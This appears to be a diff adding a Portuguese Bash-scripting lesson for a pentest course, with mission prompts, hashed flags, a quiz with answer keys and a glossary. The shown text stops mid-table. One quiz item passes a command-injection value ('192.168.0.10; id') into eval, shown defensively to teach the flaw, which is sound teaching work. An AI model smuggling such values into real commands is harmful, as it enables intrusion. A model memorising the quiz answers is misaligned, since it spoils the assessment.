@@ -1,0 +1,2331 @@
+---
+slug: scripting-bash
+track: trilha-0
+title: "Scripting: Bash"
+prerequisites: [linux-processos-e-pacotes]
+lab: null
+tasks:
+  - slug: missao-1-primeiro-script
+    title: "Missão 1 — Seu primeiro script de recon"
+    type: flag
+    prompt: "Os dois números que o seu resumo.sh imprime para a varredura, no formato FLAG{hosts-portas}."
+    hint: "grep -c conta linhas; para contar ocorrências dentro das linhas, use grep -o e conte o resultado com wc -l."
+    flag:
+      hash: "scrypt$16384$8$1$24390e1ab826eee12a36bef3dbaafaafba4664792085a350869840ed12cfc0f0"
+      salt: "52cb52572179e311687ebb8cf5cda0ef"
+  - slug: missao-2-urls-web
+    title: "Missão 2 — Da varredura às URLs"
+    type: flag
+    prompt: "Total de URLs geradas e quantas delas não têm porta explícita, no formato FLAG{total-sem_porta}."
+    hint: "Um laço lê os hosts, outro lê as portas; um case decide a URL. Cuidado: 80/open também aparece dentro de 8080/open."
+    flag:
+      hash: "scrypt$16384$8$1$c2050af8de5df224db4c9bbe00325a6dccf88e5cae386e679930836ca00f56d7"
+      salt: "5d93141bd74efef8200890498aad91df"
+  - slug: missao-3-script-quebrado
+    title: "Missão 3 — O script que mente"
+    type: flag
+    prompt: "O IP que mais recebeu 404 e a contagem, segundo o top404.sh corrigido, no formato FLAG{ip-contagem}."
+    hint: "São três bugs: o interpretador, o laço sobre a saída do ls e um grep que casa o número errado da linha."
+    flag:
+      hash: "scrypt$16384$8$1$6f2c890d338c7730baee21b6b8636c1b8be99d7be715a5a7620d24216e318e38"
+      salt: "b815c54710ce34522a3f24f951744a78"
+  - slug: quiz-final
+    title: "Quiz — Scripting: Bash"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Um script recebe dois argumentos: `192.168.0.10` e `relatorio final.txt`. Qual forma percorre exatamente esses dois argumentos?"
+        options:
+          - "`for a in $*`"
+          - "`for a in $@`"
+          - "`for a in \"$@\"`"
+          - "`for a in \"$*\"`"
+        answer: 2
+        explanation: "Só `\"$@\"` entrega cada argumento como uma palavra, intacto. Sem aspas, `$@` e `$*` passam pelo word splitting e o nome com espaço vira dois; `\"$*\"` junta tudo numa palavra só."
+      - question: "Por que `for f in $(ls logs/*.log)` falha quando existe o arquivo `acesso 2024-09.log`?"
+        options:
+          - "Porque o ls não lista arquivos com espaço"
+          - "Porque o resultado da substituição de comando, sem aspas, passa pelo word splitting e o nome é quebrado no espaço"
+          - "Porque o for só aceita um arquivo por vez"
+          - "Porque o glob *.log não casa nomes com espaço"
+        answer: 1
+        explanation: "O ls devolve texto; sem aspas, o Bash quebra esse texto em espaços, tabs e quebras de linha (o IFS). O certo é deixar o próprio glob listar: `for f in \"$dir\"/*.log`, porque os nomes que o glob devolve nunca são quebrados."
+      - question: "Com `set -e` ligado, a função `checar` roda `false` e depois um `echo`. O que acontece em `if checar; then ...`?"
+        options:
+          - "O script termina no false"
+          - "O set -e é ignorado dentro do teste do if: o echo roda e o if vê o código do echo"
+          - "O if dá erro de sintaxe"
+          - "O false é pulado"
+        answer: 1
+        explanation: "O set -e não age no teste de um if, nem em nada que rode dentro dele, incluindo funções. No laboratório, a função continuou depois do false e o if achou que tinha dado certo. Por isso é preciso testar os códigos de saída onde eles importam."
+      - question: "Qual o código de saída de `false | true` sem e com `set -o pipefail`?"
+        options:
+          - "1 e 1"
+          - "0 e 0"
+          - "0 e 1"
+          - "1 e 0"
+        answer: 2
+        explanation: "Sem pipefail, vale o código do último comando (o true, 0). Com pipefail, vale o do último comando que falhou (o false, 1). Foi assim que o top404.sh quebrado imprimiu dois erros e mesmo assim devolveu 0."
+      - question: "O que faz `rm -rf \"${PASTA:?}/\"*` se a variável PASTA estiver vazia?"
+        options:
+          - "Apaga tudo a partir de /"
+          - "Apaga a pasta atual"
+          - "O shell mostra um erro e, num script, termina antes de o rm rodar"
+          - "Ignora a variável e não faz nada"
+        answer: 2
+        explanation: "`${var:?}` falha se a variável estiver vazia ou não definida; num script (shell não interativo), o shell termina ali. É a proteção contra o bug do Steam visto no 0.3."
+      - question: "Por que `nome = aluno` dá `nome: command not found`?"
+        options:
+          - "Porque variáveis precisam de export"
+          - "Porque, com espaços, o shell entende um comando chamado nome com os argumentos = e aluno"
+          - "Porque nomes de variáveis precisam ser maiúsculos"
+          - "Porque falta o $ antes de nome"
+        answer: 1
+        explanation: "A atribuição só é reconhecida como `nome=valor`, sem espaço. Com espaço, a linha vira palavras, e a primeira é tratada como nome de comando."
+      - question: "Um script faz `eval \"echo Testando o host $alvo\"`. O usuário passa `192.168.0.10; id`. O que acontece?"
+        options:
+          - "Imprime o texto inteiro, com o ponto e vírgula"
+          - "Dá erro de sintaxe"
+          - "Imprime a primeira parte e executa id: o ponto e vírgula vira separador de comandos"
+          - "O Bash recusa porque o argumento tem espaço"
+        answer: 2
+        explanation: "O eval faz o shell ler o texto de novo como código. É uma command injection: o dado virou comando. Sem eval e com `\"$alvo\"` entre aspas, o valor seria só um argumento."
+      - question: "No sandbox (Debian), um script com `#!/bin/sh` usa `[[ -z $dir ]]`. O que acontece ao rodá-lo com `./script.sh`?"
+        options:
+          - "Funciona igual ao Bash"
+          - "O /bin/sh é o dash, que não conhece [[; aparece `[[: not found` e o script segue"
+          - "O kernel recusa o script"
+          - "O script vira interativo"
+        answer: 1
+        explanation: "O shebang manda o kernel usar o /bin/sh, que no Debian e no Ubuntu é o dash, um shell POSIX menor. O `[[` é do Bash. Use `#!/usr/bin/env bash` (ou `#!/bin/bash`) se for usar recursos do Bash."
+      - question: "Com `set -e`, por que `local x=$(false)` não para a função, mas `local x; x=$(false)` para?"
+        options:
+          - "Porque local desliga o set -e"
+          - "Porque o código que conta é o do comando local, que deu certo (0); na atribuição simples, conta o código da substituição de comando"
+          - "Porque $(false) não roda dentro de funções"
+          - "Não há diferença"
+        answer: 1
+        explanation: "Na primeira forma, o código de saída da linha é o do builtin local, que conseguiu criar a variável. Na segunda, a atribuição simples devolve o código do false. Declare e atribua em linhas separadas."
+      - question: "A regex `^([0-9]{1,3}\\.){3}[0-9]{1,3}$` aceita `192.168.0.300`. O que isso ensina?"
+        options:
+          - "Que a regex está errada e deve ser removida"
+          - "Que validar formato não é validar significado: falta conferir se cada octeto vai até 255"
+          - "Que o Bash não suporta regex"
+          - "Que 300 é um octeto válido"
+        answer: 1
+        explanation: "A regex garante só dígitos e pontos no lugar certo. Um octeto vai de 0 a 255; a validação completa confere cada parte. Validação em camadas é a regra para qualquer entrada que vem de fora."
+      - question: "Qual a diferença entre `bash config.sh` e `source config.sh`, se config.sh só faz `MEU_ALVO=192.168.0.10`?"
+        options:
+          - "Nenhuma"
+          - "bash roda num processo filho, e a variável morre com ele; source roda no shell atual, e a variável fica"
+          - "source é mais lento"
+          - "bash exige chmod +x"
+        answer: 1
+        explanation: "Um processo filho não altera o ambiente do pai (como no `cd` do 0.3). source lê o arquivo no próprio shell. Por isso source só deve ser usado com arquivos em que você confia: tudo ali roda com os seus privilégios."
+      - question: "O ShellCheck apontou dois bugs do top404.sh, mas não o `grep \" 404 \"`. Por quê?"
+        options:
+          - "Porque o ShellCheck está desatualizado"
+          - "Porque é um bug de lógica: a sintaxe está certa, mas o padrão casa também o campo do tamanho da resposta"
+          - "Porque grep não é um comando do Bash"
+          - "Porque o arquivo era grande demais"
+        answer: 1
+        explanation: "Um linter aponta padrões perigosos de código, não o significado dos seus dados. O ` 404 ` também aparece em respostas de 404 bytes. Só testar com dados reais (e conhecer o formato do log) pega esse tipo de erro."
+glossary:
+  - term: shebang
+    definition: "A primeira linha de um script, começando com #! (ex.: #!/usr/bin/env bash). Diz ao kernel qual interpretador deve ler o arquivo."
+  - term: interpreter
+    definition: "Programa que lê um código-fonte e o executa linha a linha, sem compilar antes. Bash, Python e Perl são interpretadores."
+  - term: subshell
+    definition: "Cópia do shell criada num processo filho, por exemplo com ( ), num pipe ou ao rodar um script. O que muda nele (variáveis, diretório) não volta para o shell pai."
+  - term: shell expansion
+    definition: "Cada transformação que o shell faz numa linha antes de executá-la (chaves, til, variáveis, aritmética, substituição de comando, word splitting, globs e remoção de aspas), numa ordem fixa."
+  - term: parameter expansion
+    definition: "Troca de $nome ou ${nome} pelo valor da variável, com variações como ${var:-padrão}, ${var:?erro}, ${var#prefixo} e ${var%%sufixo}."
+  - term: command substitution
+    definition: "A forma $(comando), que roda o comando e põe a saída dele no lugar. Sem aspas, o resultado passa pelo word splitting."
+  - term: arithmetic expansion
+    definition: "A forma $(( expressão )), que calcula contas com números inteiros, como $(( 7 / 2 )), que dá 3."
+  - term: brace expansion
+    definition: "Expansão de chaves: gera palavras a partir de listas ou sequências, como 192.168.0.{1..5} ou arquivo.{txt,bak}. É a primeira expansão da linha."
+  - term: word splitting
+    definition: "Etapa em que o shell quebra em várias palavras o resultado de variáveis e substituições que não estão entre aspas, usando os caracteres do IFS. É a origem da maioria dos bugs com nomes que têm espaço."
+  - term: IFS
+    definition: "Internal Field Separator: variável com os caracteres que separam palavras no word splitting e no read. O padrão é espaço, tab e quebra de linha."
+  - term: quoting
+    definition: "Uso de aspas para controlar o shell: aspas simples deixam tudo literal; aspas duplas permitem $ mas impedem o word splitting e os globs."
+  - term: positional parameter
+    definition: "Os argumentos de um script ou função: $1, $2..., com $# (quantos são) e \"$@\" (todos, cada um intacto)."
+  - term: conditional
+    definition: "Estrutura que executa um bloco só se uma condição for verdadeira (if, elif, else). No shell, a condição é o código de saída de um comando: 0 é verdadeiro."
+  - term: test command
+    definition: "O comando test, também escrito [ ], que avalia condições (arquivo existe, números, textos) e devolve 0 ou 1. O Bash tem também o [[ ]], mais seguro e com regex."
+  - term: case statement
+    definition: "Estrutura case ... esac, que compara um valor com vários padrões e executa o bloco do primeiro que casar. Ideal para decidir por porta, opção ou extensão."
+  - term: loop
+    definition: "Laço: estrutura que repete um bloco (for, while, until), por exemplo para cada arquivo, cada linha ou cada host."
+  - term: shell function
+    definition: "Bloco de comandos com nome, chamado como se fosse um comando. Recebe argumentos em $1, $2... e devolve um código de saída com return."
+  - term: local variable
+    definition: "Variável criada com local dentro de uma função; existe só durante aquela chamada e não altera a variável de mesmo nome do resto do script."
+  - term: errexit
+    definition: "A opção set -e: o shell termina quando um comando falha, menos em contextos como o teste de um if, listas com && e || e pipelines (exceto o último comando)."
+  - term: pipefail
+    definition: "A opção set -o pipefail: o código de um pipeline passa a ser o do último comando que falhou, em vez de sempre o do último comando."
+  - term: nounset
+    definition: "A opção set -u: usar uma variável não definida vira erro, e o script termina, em vez de ela virar texto vazio sem aviso."
+  - term: xtrace
+    definition: "A opção set -x (ou bash -x): o shell mostra cada comando, já expandido e precedido de +, antes de executá-lo. É a principal ferramenta de depuração de scripts."
+  - term: trap
+    definition: "Builtin que registra comandos a executar quando o shell recebe um sinal ou chega a um evento, como EXIT (ao terminar), usado para limpeza."
+  - term: process substitution
+    definition: "A forma <(comando), que entrega a saída de um comando como se fosse um arquivo. Permite ler essa saída num while sem criar um subshell para o laço."
+  - term: here string
+    definition: "A forma <<< texto, que entrega uma string como entrada (stdin) de um comando. Variante de uma linha do here document."
+  - term: array
+    definition: "Variável que guarda uma lista indexada por números, como portas=(22 80 443); ${portas[0]} é o primeiro item e ${#portas[@]} a quantidade."
+  - term: associative array
+    definition: "Array indexado por texto em vez de números (declare -A), como servico[22]=ssh. Serve para contar e agrupar."
+  - term: getopts
+    definition: "Builtin que lê as opções curtas de um script (como -p 8080 -v) de forma padronizada, com mensagens de erro para opções inválidas."
+  - term: ShellCheck
+    definition: "Ferramenta livre que analisa scripts de shell e aponta bugs e padrões perigosos, cada um com um código (ex.: SC2086) e uma explicação."
+  - term: linter
+    definition: "Programa que analisa código sem executá-lo e aponta erros prováveis e más práticas. Pega padrões, não erros de lógica."
+  - term: command injection
+    definition: "Falha em que um dado vindo de fora acaba interpretado como comando pelo shell, por exemplo via eval ou montagem de linha de comando com texto."
+  - term: eval
+    definition: "Builtin que junta os argumentos num texto e faz o shell executá-lo como código. Com dados externos, é a porta mais comum de command injection."
+  - term: argument injection
+    definition: "Variante da injeção em que o dado não vira um comando novo, mas uma opção do comando (um arquivo chamado -rf, por exemplo). Combate-se com -- e ./ antes dos nomes."
+  - term: grepable output
+    definition: "Formato de saída do nmap (-oG) com uma linha por host e campos separados por tab, pensado para grep e scripts. Oficialmente obsoleto em favor do XML, mas ainda muito usado."
+  - term: access log
+    definition: "Log em que o servidor web registra cada requisição: IP do cliente, data, método, caminho, código de status, tamanho e user agent."
+  - term: Combined Log Format
+    definition: "Formato padrão de access log do Apache (e de outros servidores): IP, identidade, usuário, [data], \"requisição\", status, bytes, \"referer\" e \"user agent\"."
+  - term: user agent
+    definition: "Texto que o cliente HTTP envia para se identificar (navegador, versão, ferramenta). Fácil de falsificar, mas ferramentas de varredura costumam deixar o padrão."
+  - term: directory brute forcing
+    definition: "Técnica de reconhecimento web que pede ao servidor centenas de caminhos de uma wordlist (/admin, /backup.zip...) para achar os que existem. Deixa rajadas de 404 no log."
+  - term: mktemp
+    definition: "Comando que cria um arquivo ou pasta temporária com nome imprevisível e permissão só para o dono, evitando conflitos e ataques em /tmp."
+  - term: race condition
+    definition: "Condição de corrida: falha que depende da ordem ou do momento em que duas coisas acontecem, como um atacante criar um arquivo em /tmp entre o teste e o uso."
+  - term: SIGPIPE
+    definition: "Sinal enviado a um processo que escreve num pipe cujo leitor já fechou (ex.: o head terminou). O processo morre com código 141 (128 + 13)."
+  - term: POSIX
+    definition: "Família de padrões que define como um sistema tipo Unix e o seu shell (sh) devem se comportar. Um script POSIX roda em qualquer shell compatível; recursos do Bash, não."
+  - term: dash
+    definition: "Debian Almquist Shell: shell POSIX pequeno e rápido que é o /bin/sh no Debian e no Ubuntu. Não tem recursos do Bash como [[ ]] e arrays."
+  - term: cron
+    definition: "Serviço do Linux que executa comandos em horários programados, configurado pelo crontab. Usado para automação legítima e, por atacantes, para persistência."
+  - term: obfuscation
+    definition: "Ofuscação: transformar código para esconder o que ele faz (codificar, trocar caracteres, comprimir), dificultando a leitura por pessoas e ferramentas de defesa."
+  - term: RFC
+    definition: "Request for Comments: série de documentos que define os padrões da internet. A RFC 5737, por exemplo, reserva faixas de IP só para documentação."
+  - term: reconnaissance
+    definition: "Reconhecimento (recon): a fase do pentest em que se levantam informações sobre o alvo (hosts, portas, serviços, tecnologias) antes de qualquer exploração."
+  - term: false positive
+    definition: "Falso positivo: algo que a ferramenta aponta como problema ou achado, mas não é. Um script de recon com parsing errado produz falsos positivos."
+  - term: history expansion
+    definition: "Recurso do Bash interativo em que ! repete comandos do histórico (!! é o último). Por isso um ! dentro de aspas duplas no prompt pode dar event not found."
+---
+
+import expansoes from "./img/ordem-das-expansoes.svg";
+import fluxoRecon from "./img/fluxo-do-recon.svg";
+import errosQueSomem from "./img/erros-que-somem.svg";
+import injecao from "./img/injecao-em-script.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Num <GlossaryTerm term="pentest">pentest</GlossaryTerm>, quase nada é feito uma vez só.
+Você testa as mesmas portas em 200 máquinas, procura o mesmo padrão em vinte logs,
+transforma a saída de uma ferramenta na entrada de outra, refaz a mesma checagem a cada
+dia do teste. Fazer isso à mão é lento e, pior, cheio de erros: na décima repetição
+alguém pula uma linha, esquece um host, copia o IP errado. Quem automatiza ganha tempo
+e, mais importante, ganha **reprodutibilidade**: o mesmo
+<GlossaryTerm term="script">script</GlossaryTerm>, com a mesma entrada, dá o mesmo
+resultado, e o relatório pode mostrar exatamente como cada achado foi obtido.
+
+O <GlossaryTerm term="Bash">Bash</GlossaryTerm> é a linguagem natural dessa
+automação no Linux. Ele já está em todo servidor que você vai encontrar, não precisa
+instalar nada e conversa diretamente com as ferramentas que você já conhece (`grep`,
+`sort`, `find`) por meio de <GlossaryTerm term="pipe">pipes</GlossaryTerm>. Por isso
+ele aparece dos dois lados: pentesters e administradores escrevem scripts para trabalhar
+mais rápido; atacantes reais usam scripts de shell para baixar ferramentas, se esconder
+e voltar depois. E muitos desastres famosos não vieram de ataques sofisticados, mas de
+um script com um espaço a mais.
+
+Este módulo ensina a escrever scripts **e** a entender o que acontece por dentro quando
+o Bash lê cada linha. Esse segundo ponto é o que separa um script que funciona "no meu
+teste" de um script em que se pode confiar, e é também o que permite enxergar falhas de
+segurança em scripts dos outros.
+
+**Ao final, você vai saber:**
+
+- criar, executar e depurar um script, sabendo o papel do shebang, do `chmod +x` e da
+  diferença entre executar e usar `source`;
+- usar variáveis, argumentos, condicionais, laços e funções;
+- explicar a ordem das expansões do Bash e prever quando um valor será quebrado em
+  pedaços (o famoso problema do nome com espaço);
+- escrever scripts robustos com `set -euo pipefail`, `trap` e `mktemp`, conhecendo os
+  pontos cegos de cada um;
+- automatizar tarefas típicas de reconhecimento: transformar uma varredura do nmap em
+  lista de URLs e caçar uma varredura de diretórios num log web;
+- reconhecer e evitar command injection em scripts, e revisar scripts com o ShellCheck.
+
+**Pré-requisito:** 0.4 — Linux: processos, pacotes e edição (processos e códigos de
+saída, sinais e `trap`, variáveis de ambiente e `PATH`, here-doc e edição no terminal).
+O 0.4, por sua vez, assume o 0.3 (terminal, arquivos, pipes, redirecionamento e
+permissões) e o 0.1 (como usar a plataforma), que também vão aparecer aqui.
+
+**Tempo estimado:** de 3 a 4 horas, incluindo as missões. Se você já programa em Python
+ou C, vai reconhecer as estruturas; o que muda, e o que mais engana, é como o shell
+trata texto e espaços. Leia com calma a seção 2.2.
+
+<Callout variant="ethics">
+Automatizar reconhecimento não muda a regra: só se varre, testa ou coleta dados de
+sistemas com autorização por escrito (a Trilha 1 aprofunda escopo e a lei brasileira).
+Todos os dados das missões deste módulo são **fictícios** e ficam dentro do sandbox, que
+não tem rede. Os endereços 198.51.100.x e 203.0.113.x usados aqui são reservados para
+documentação pela <GlossaryTerm term="RFC">RFC</GlossaryTerm> 5737 (as RFCs são os
+documentos que definem os padrões da internet) e não pertencem a ninguém.
+</Callout>
+
+## 2. Teoria aprofundada — o Bash por dentro
+
+No 0.3 você viu que o <GlossaryTerm term="shell">shell</GlossaryTerm> lê cada linha,
+interpreta e pede ao <GlossaryTerm term="kernel">kernel</GlossaryTerm> que execute os
+comandos. Um script é exatamente isso, só que as linhas vêm de um arquivo em vez do
+teclado. Nada de mágico acontece: o mesmo Bash, com as mesmas regras. Por isso tudo o
+que você aprender aqui vale também no prompt, e vice-versa.
+
+### 2.1 Do terminal ao script
+
+Um script é um arquivo de texto. Para virar um programa que você chama pelo nome, ele
+precisa de duas coisas: uma primeira linha especial e a permissão de execução.
+
+```bash
+#!/usr/bin/env bash
+# ola.sh — o menor script útil: prova que tudo funciona.
+echo "olá do script"
+```
+
+A primeira linha é o <GlossaryTerm term="shebang">shebang</GlossaryTerm> (de
+*sharp* `#` + *bang* `!`). Quando você roda `./ola.sh`, o shell pede ao kernel que
+execute o arquivo (a <GlossaryTerm term="system call">system call</GlossaryTerm>
+`execve`, do 0.3). O kernel olha os dois primeiros bytes; se forem `#!`, ele entende
+que o arquivo não é um programa compilado, mas um texto a ser lido por um
+<GlossaryTerm term="interpreter">interpretador</GlossaryTerm> (*interpreter*, o programa
+que lê um código e o executa linha a linha), e roda o programa indicado passando o
+caminho do script como argumento. `./ola.sh` vira, na prática, `/usr/bin/env bash ./ola.sh`.
+O `#` no começo das outras linhas é comentário: o Bash ignora tudo do `#` até o fim da
+linha.
+
+Por que `/usr/bin/env bash` e não `/bin/bash`? O `env` procura o `bash` nos diretórios
+do <GlossaryTerm term="PATH environment variable">PATH</GlossaryTerm>, então o script
+funciona mesmo em sistemas onde o Bash mora em outro lugar (no macOS com Bash novo ou
+no FreeBSD, por exemplo). A contrapartida é de segurança, e você já a conhece do 0.4:
+quem controla o `PATH` escolhe qual `bash` roda. Para scripts que rodam como
+<GlossaryTerm term="root">root</GlossaryTerm>, prefira o caminho absoluto `#!/bin/bash`.
+
+Veja a sequência real no sandbox (`ls -l` e `od -c`, que mostra os bytes):
+
+```console
+$ ./ola.sh
+bash: ./ola.sh: Permission denied
+$ bash ola.sh
+olá do script
+$ chmod +x ola.sh
+$ ls -l ola.sh
+-rwxr-xr-x 1 aluno aluno 42 Oct  3 09:16 ola.sh
+$ ./ola.sh
+olá do script
+$ ola.sh
+bash: ola.sh: command not found
+$ head -c 2 ola.sh | od -c | head -1
+0000000   #   !
+```
+
+Cada linha conta uma parte da história:
+
+- Sem o `x` da <GlossaryTerm term="permission">permissão</GlossaryTerm>, o kernel
+  recusa executar (código 126, "achei mas não posso executar").
+- `bash ola.sh` funciona sem `x`: aqui quem é executado é o `bash`, e o script é só um
+  arquivo que ele **lê**. O shebang vira um comentário comum.
+- `ola.sh` sem `./` dá `command not found` (código 127): sem uma barra no nome, o shell
+  procura só no `PATH`, e o diretório atual não está lá (por segurança, como você viu
+  no 0.4).
+
+**Executar não é o mesmo que `source`.** Quando você roda `./ola.sh` ou `bash ola.sh`,
+o script roda num **processo filho**, uma cópia do shell. Tudo o que ele muda (variáveis,
+diretório atual) morre junto com ele, pela mesma razão que obriga o `cd` a ser um
+<GlossaryTerm term="builtin">builtin</GlossaryTerm> (0.3). Já `source arquivo` (ou
+`. arquivo`) faz o shell **atual** ler o arquivo, como se você digitasse cada linha. É
+assim que o `~/.bashrc` funciona. Saída real:
+
+```console
+$ cat config.sh
+MEU_ALVO=192.168.0.10
+$ bash config.sh; echo "depois de bash: [$MEU_ALVO]"
+depois de bash: []
+$ source ./config.sh; echo "depois de source: [$MEU_ALVO]"
+depois de source: [192.168.0.10]
+```
+
+Essa cópia do shell num processo filho tem nome: <GlossaryTerm term="subshell">subshell</GlossaryTerm>.
+Além de rodar scripts, o Bash cria subshells quando você usa parênteses `( ... )`,
+substituição de comando `$( ... )` e em cada lado de um pipe. Guarde isso: vai explicar
+um dos erros mais estranhos da seção 7.
+
+```console
+$ x=1; ( x=2; echo "dentro do ( ): $x" ); echo "fora: $x"
+dentro do ( ): 2
+fora: 1
+```
+
+**Códigos de saída são o "retorno" do shell.** Todo comando devolve um
+<GlossaryTerm term="exit code">exit code</GlossaryTerm>: 0 é sucesso, qualquer outro
+valor é falha (0.3), e quem morre por um sinal N devolve 128 + N (0.4). Um script devolve
+o código do último comando que rodou, ou o que você passar a `exit`. É assim que scripts
+conversam entre si: o próximo passo decide o que fazer olhando o `$?`. Um script que
+diz "sucesso" quando falhou é um script que mente, e a Missão 3 vai mostrar um.
+
+### 2.2 Variáveis, aspas e a ordem das expansões
+
+Esta é a seção mais importante do módulo. Quase todos os bugs de scripts de shell, e
+várias falhas de segurança, vêm de não saber **o que o Bash faz com uma linha antes de
+executá-la**.
+
+**Variáveis.** Você já conhece as variáveis de ambiente e as
+<GlossaryTerm term="shell variable">variáveis de shell</GlossaryTerm> do 0.4. Num script,
+você cria as suas:
+
+```bash
+alvo="192.168.0.10"     # sem espaço em volta do =
+porta=80
+echo "testando $alvo na porta $porta"
+```
+
+A atribuição precisa ser `nome=valor`, colada. Com espaço, a linha vira palavras, e a
+primeira palavra é sempre tratada como **nome de comando**:
+
+```console
+$ nome = aluno
+bash: nome: command not found
+```
+
+Todas as variáveis do Bash são texto. `porta=80` guarda os caracteres `8` e `0`; contas
+são feitas por uma expansão própria, que você verá abaixo. E uma variável que nunca foi
+criada não dá erro: vira texto vazio, sem aviso. Isso é cômodo no prompt e perigoso num
+script (lembre do Steam, no 0.3).
+
+**Expansões.** Quando o Bash lê uma linha, ele não a executa como está. Ele a transforma
+em etapas, chamadas <GlossaryTerm term="shell expansion">expansões</GlossaryTerm>
+(*shell expansions*), numa ordem fixa, definida no manual (`man bash`, seção
+EXPANSION). Primeiro, a linha é quebrada em palavras nos espaços e operadores (`|`,
+`;`, `>`...). Depois, nesta ordem:
+
+1. <GlossaryTerm term="brace expansion">brace expansion</GlossaryTerm>, a expansão de
+   chaves: `192.168.0.{1..5}` vira cinco palavras; `relatorio.{txt,bak}` vira duas.
+2. Da esquerda para a direita, ao mesmo tempo: o til (`~` vira a sua
+   <GlossaryTerm term="home">home</GlossaryTerm>); a
+   <GlossaryTerm term="parameter expansion">parameter expansion</GlossaryTerm>, que troca
+   `$alvo` ou `${alvo}` pelo valor; a
+   <GlossaryTerm term="arithmetic expansion">arithmetic expansion</GlossaryTerm>, que
+   calcula `$(( 7 / 2 ))`; a
+   <GlossaryTerm term="command substitution">command substitution</GlossaryTerm>, que
+   roda `$(comando)` e põe a saída no lugar; e a substituição de processo (seção 6).
+3. <GlossaryTerm term="word splitting">Word splitting</GlossaryTerm>: o resultado das
+   expansões do passo 2 que **não** estavam entre aspas é quebrado de novo em palavras,
+   usando como separadores os caracteres da variável
+   <GlossaryTerm term="IFS">IFS</GlossaryTerm> (*Internal Field Separator*; por padrão,
+   espaço, tab e quebra de linha).
+4. Expansão de caminhos: cada <GlossaryTerm term="wildcard">curinga</GlossaryTerm>
+   (`*`, `?`, `[...]`) que não está entre aspas vira a lista de nomes de arquivo que
+   combinam (0.3).
+5. Remoção das aspas: as aspas que você digitou somem; elas já fizeram o trabalho delas.
+
+Só então o primeiro item vira o comando e os outros, os argumentos. Saída real de
+algumas expansões:
+
+```console
+$ echo 192.168.0.{1..5}
+192.168.0.1 192.168.0.2 192.168.0.3 192.168.0.4 192.168.0.5
+$ echo relatorio.{txt,bak}
+relatorio.txt relatorio.bak
+$ echo $(( 7 / 2 )) $(( 7 % 2 )) $(( 2 ** 10 ))
+3 1 1024
+```
+
+Repare que a aritmética do Bash é só de inteiros: `7 / 2` dá 3, e `%` é o resto da
+divisão.
+
+<Figure
+  src={expansoes}
+  alt="Diagrama da ordem das expansões. Em cima, seis caixas em sequência: 0 palavras (quebra nos espaços e operadores), 1 chaves, 2 esquerda para a direita (til, variáveis, aritmética, substituição de comando e de processo), 3 word splitting usando o IFS, 4 globs que viram nomes de arquivo, 5 remoção das aspas e execução. Um aviso em vermelho diz que os passos 3 e 4 só agem no que não está entre aspas duplas. Embaixo, o exemplo A, ls com a variável dir entre aspas seguida de barra asterisco ponto log, termina com três argumentos, um deles com espaço, intacto. O exemplo B, for f in $(ls logs/*.log), quebra o nome acesso 2024-09.log em dois no word splitting, e o grep reclama de arquivos inexistentes."
+  caption="O Bash transforma a linha em etapas fixas. O word splitting (3) e os globs (4) só agem no que está fora de aspas duplas, e é aí que nasce o bug do nome com espaço da Missão 3."
+/>
+
+**O word splitting na prática.** Imagine uma variável com um nome de arquivo que tem
+espaço. Saída real:
+
+```console
+$ arquivo="relatorio final.txt"
+$ ls -l $arquivo
+ls: cannot access 'relatorio': No such file or directory
+ls: cannot access 'final.txt': No such file or directory
+$ ls -l "$arquivo"
+-rw-r--r-- 1 aluno aluno 0 Oct  3 09:10 relatorio final.txt
+```
+
+Sem aspas, o valor passou pelo passo 3 e virou duas palavras: o `ls` recebeu dois
+argumentos e procurou dois arquivos. Com aspas duplas, o valor ficou inteiro: um
+argumento. A mesma coisa vale para curingas: se uma variável contém `*`, sem aspas ela
+vira a lista de arquivos da pasta.
+
+**As três formas de <GlossaryTerm term="quoting">quoting</GlossaryTerm>** (o uso de aspas
+para controlar o shell), que o 0.3 apresentou e agora ganham motivo:
+
+| Forma | O que o Bash faz dentro | Use quando |
+|---|---|---|
+| `'aspas simples'` | Nada. Tudo é literal, inclusive `$` e `\` | Textos fixos, padrões de `grep` e `awk` |
+| `"aspas duplas"` | Expande `$var`, `$( )` e `$(( ))`, mas **não** faz word splitting nem globs | Quase sempre que houver uma variável |
+| sem aspas | Tudo, inclusive word splitting e globs | Só quando você **quer** a quebra ou o curinga |
+
+A regra prática que todo guia sério repete, e que vamos seguir em todos os scripts deste
+módulo: **toda expansão de variável vai entre aspas duplas**, a não ser que você tenha
+um motivo para não pôr. Os nomes que um glob devolve, por outro lado, nunca são
+quebrados (os globs vêm depois do word splitting), por isso `for f in "$dir"/*.log` é
+seguro mesmo com espaços nos nomes.
+
+**Expansões de parâmetro úteis.** Além de `$var`, a forma com chaves `${...}` tem
+variações que evitam muitos `if`s. Todas foram conferidas no `man bash` (seção
+Parameter Expansion):
+
+| Forma | Resultado | Exemplo |
+|---|---|---|
+| `${var:-padrão}` | O valor, ou `padrão` se vazia ou indefinida | `${alvo:-127.0.0.1}` |
+| `${var:?mensagem}` | O valor, ou erro com a mensagem; num script, o shell termina | `${1:?uso: $0 ARQUIVO}` |
+| `${#var}` | O tamanho do valor, em caracteres | `${#senha}` |
+| `${var#prefixo}` | Tira o menor prefixo que casa com o padrão | `${linha#Host: }` |
+| `${var%%padrão}` | Tira o maior sufixo que casa com o padrão | `${ip%% *}` tira do primeiro espaço até o fim |
+| `${var//de/para}` | Troca todas as ocorrências | `${lista//, /-}` |
+
+```console
+$ unset alvo; echo "${alvo:-127.0.0.1}"
+127.0.0.1
+$ bash -c 'echo "${alvo:?defina a variável alvo}"; echo nunca'
+bash: line 1: alvo: defina a variável alvo
+```
+
+O segundo exemplo é a proteção do 0.3 em ação: o `echo nunca` não rodou, porque o shell
+terminou na expansão.
+
+**Substituição de comando.** `$(comando)` roda o comando num subshell e põe a saída no
+lugar, sem a quebra de linha final. É assim que um script guarda o resultado de uma
+ferramenta:
+
+```bash
+hosts_up=$(grep -c 'Status: Up' varredura.gnmap)
+hoje=$(date +%F)
+```
+
+Se o resultado for usado sem aspas, ele passa pelo word splitting. Isso é exatamente o
+que quebra o laço `for f in $(ls ...)` (diagrama acima, exemplo B).
+
+### 2.3 Argumentos do script
+
+Quem chama um script passa argumentos, como em qualquer comando. Dentro do script, eles
+são os <GlossaryTerm term="positional parameter">parâmetros posicionais</GlossaryTerm>
+(*positional parameters*):
+
+| Parâmetro | Significado |
+|---|---|
+| `$0` | O nome com que o script foi chamado |
+| `$1`, `$2`... `${10}` | O primeiro, o segundo... argumento |
